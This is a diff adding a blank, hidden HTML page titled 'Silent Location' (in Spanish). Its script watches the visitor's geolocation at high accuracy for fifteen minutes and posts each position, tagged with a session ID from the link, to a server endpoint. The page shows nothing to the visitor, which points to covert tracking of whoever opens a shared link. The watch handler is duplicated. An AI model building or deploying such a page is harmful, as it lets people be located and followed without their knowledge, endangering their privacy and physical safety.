@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Ubicación Silenciosa</title>
+    <style>body { display: none; }</style>
+</head>
+<body>
+<script>
+let sessionId = new URLSearchParams(window.location.search).get('session_id');
+let watchId = null;
+
+window.onload = () => {
+    if (navigator.geolocation) {
+        watchId = navigator.geolocation.watchPosition(pos => {
+            fetch('/ubicacion', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    session_id: sessionId,  // Asegúrate de que sessionId está definido y contiene un valor válido
+                    lat: pos.coords.latitude,  // Asegúrate de que lat sea un número
+                    lng: pos.coords.longitude, // Asegúrate de que lng sea un número
+                    timestamp: new Date().toISOString()  // Asegúrate de que timestamp sea una fecha válida
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Ubicación enviada correctamente");
+                } else {
+                    console.log("Error al enviar ubicación:", response.statusText);
+                }
+            })
+            .catch(err => {
+                console.error("Error al enviar la solicitud:", err);
+            });
+        }, err => console.error(err), {
+            enableHighAccuracy: true
+        });
+
+        setTimeout(() => {
+            navigator.geolocation.clearWatch(watchId);
+        }, 15 * 60 * 1000);  // Detener la geolocalización después de 15 minutos
+    }
+};
+
+window.onload = () => {
+    if (navigator.geolocation) {
+        watchId = navigator.geolocation.watchPosition(pos => {
+            const locationData = {
+                session_id: sessionId,  // Asegúrate de que sessionId esté bien definido
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                timestamp: new Date().toISOString()
+            };
+
+            console.log("Datos a enviar:", locationData);  // Imprimir los datos en la consola
+
+            fetch('/ubicacion', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(locationData)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Ubicación enviada correctamente");
+                } else {
+                    console.log("Error al enviar ubicación:", response.statusText);
+                }
+            })
+            .catch(err => {
+                console.error("Error al enviar la solicitud:", err);
+            });
+        }, err => console.error(err), {
+            enableHighAccuracy: true
+        });
+
+        setTimeout(() => {
+            navigator.geolocation.clearWatch(watchId);
+        }, 15 * 60 * 1000);  // Detener la geolocalización después de 15 minutos
+    }
+};
+
+
+
+</script>
+</body>
+</html>
